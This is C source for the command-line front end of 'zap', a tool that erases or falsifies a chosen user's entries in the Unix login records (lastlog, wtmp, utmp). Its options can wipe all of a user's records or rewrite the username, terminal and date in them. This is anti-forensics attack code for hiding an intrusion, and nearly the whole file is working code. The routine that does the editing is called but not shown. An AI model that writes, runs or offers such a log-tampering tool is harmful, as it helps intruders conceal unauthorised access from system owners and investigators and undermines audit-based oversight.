#include "zap2.h"
#include <getopt.h>

void usage()
{
    printf("Usage:\n");
    printf("* zap -A <username>\n");
    printf("\tErase all logs\n");
    printf("\n");
    printf("* zap -a <username> [-t <tty>] [-d <mmddyy>]\n");
    printf("\tErase with filters\n");
    printf("\t-t <tty> : Specify tty\n");
    printf("\t-d <mmddyy> : Specify date\n");
    printf("\n");
    printf("* zap -R <username1> <username1> [-t <tty1> <tty2>] [-d <mmddyy1> <mmddyy2>]\n");
    printf("\tReplace with filters\n");
    printf("\t-t <tty1> <tty2> : Specify tty and replace <tty1> to <tty2>\n");
    printf("\t-d <mmddyy1> <mmddyy2> : Specify date and replace <mmddyy1> to <mmddyy2>\n");
    printf("\n");
    exit(EXIT_FAILURE);
}


struct tm get_date(char* str) {
    struct tm tmp_tm;
    long tmp;
    char year[5] = { '2', '0', str[4], str[5], 0 };
    char mon[3] = { str[0], str[1], 0 };
    char mday[3] = { str[2], str[3], 0 };
    tmp_tm.tm_year = atoi(year) - 1900;
    tmp_tm.tm_mon = atoi(mon) - 1;
    tmp_tm.tm_mday = atoi(mday);
    return tmp_tm; 
}

int main(int argc, char *argv[])
{
    flag_A = 0;
    flag_R = 0;
    flag_a = 0;
    flag_t = 0;
    flag_d = 0;
    int c;
    while ((c = getopt(argc, argv, "A:a:R:t:d:")) != -1)
    {
        switch (c)
        {
        case 'A':
            flag_A = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'a':
            flag_a = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'R':
            flag_R = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            memcpy(user_r, argv[optind], strlen(argv[optind]) + 1);
            break;

        case 't':
            flag_t = 1;
            memcpy(line, optarg, strlen(optarg) + 1);
            if (flag_R)
            {
                memcpy(line_r, argv[optind], strlen(argv[optind]) + 1);
            }
            break;

        case 'd':
            flag_d = 1;
            date=get_date(optarg);
            if (flag_R)
            {
                date_r=get_date(argv[optind]);
            }
            break;
        default:
            usage();
        }
    }

    if (!(flag_a || flag_A || flag_R))
    {
        usage();
        exit(EXIT_FAILURE);
    }

    strncpy(lastlog_path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
    strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
    zap2();
    strncpy(path, _PATH_UTMP, strlen(_PATH_UTMP) + 1);
    zap2();
    printf("Zap!\n");
    exit(EXIT_SUCCESS);
}
